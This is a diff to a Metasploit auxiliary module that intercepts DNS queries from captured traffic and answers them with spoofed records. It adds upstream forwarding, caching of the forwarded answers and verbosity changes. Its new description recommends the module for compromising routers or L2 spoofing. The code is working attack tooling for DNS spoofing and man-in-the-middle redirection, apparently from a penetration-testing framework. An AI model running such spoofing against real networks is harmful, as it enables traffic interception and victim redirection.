@@ -18,6 +18,11 @@ class MetasploitModule < Msf::Auxiliary
         This module provides a Rex based DNS service to resolve queries intercepted
         via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings
         desired for spoofing using a hostsfile or space/semicolon separated entries.
+        In default configuration, the service operates as a normal native DNS server
+        with the exception of consuming from and writing to the wire as opposed to a
+        listening socket. Best when compromising routers or spoofing L2 in order to
+        prevent return of the real reply which causes a race condition. The method
+        by which replies are filtered is up to the user (though iptables works fine).
       },
       'Author'         => 'RageLtMan <rageltman[at]sempervictus>',
       'License'        => MSF_LICENSE,
@@ -94,20 +99,33 @@ class MetasploitModule < Msf::Auxiliary
       dlog e.backtrace
       return
     end
-    forward = req.dup
+    answered = []
     # Find cached items, remove request from forwarded packet
     req.question.each do |ques|
       cached = service.cache.find(ques.qName, ques.qType.to_s)
       if cached.empty?
         next
       else
-        req.answer = req.answer + cached
-        forward.question.delete(ques)
+        req.answer = (req.answer + cached).uniq
+        answered << ques
       end
     end
-    if req.answer.size < 1
-      vprint_status("Could not spoof any responses to #{peer}")
-      return
+    if answered.count < req.question.count and service.fwd_res
+      if !req.header.recursive?
+        vprint_status("Recursion forbidden in query for #{req.question.first.name} from #{peer}")
+      else
+        forward = req.dup
+        forward.question = req.question - answered
+        forwarded = service.fwd_res.send(Packet.validate(forward))
+        forwarded.answer.each do |ans|
+          rstring = ans.respond_to?(:address) ? "#{ans.name}:#{ans.address}" : ans.name
+          vprint_status("Caching response #{rstring} #{ans.type}")
+          service.cache.cache_record(ans)
+        end unless service.cache.nil?
+        # Merge the answers and use the upstream response
+        forwarded.answer = (req.answer + forwarded.answer).uniq
+        req = forwarded
+      end
     end
     service.send_response(cli, Packet.validate(Packet.generate_response(req)).data)
   end
@@ -119,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     cli.payload = data
     cli.recalc
     inject cli.to_s
-    sent_info(cli,data)
+    sent_info(cli,data) if datastore['VERBOSE']
   end
 
   #
@@ -130,8 +148,8 @@ class MetasploitModule < Msf::Auxiliary
     net = Packet.encode_net(data)
     peer = "#{cli.ip_daddr}:" << (cli.is_udp? ? "#{cli.udp_dst}" : "#{cli.tcp_dst}")
     asked = net.question.map(&:qName).join(', ')
-    vprint_status("Sent packet with header:\n#{parsed.header.inspect}")
-    vprint_status("Spoofed records for #{asked} to #{peer}")
+    vprint_good("Sent packet with header:\n#{cli.inspect}")
+    vprint_good("Spoofed records for #{asked} to #{peer}")
   end
 
 end
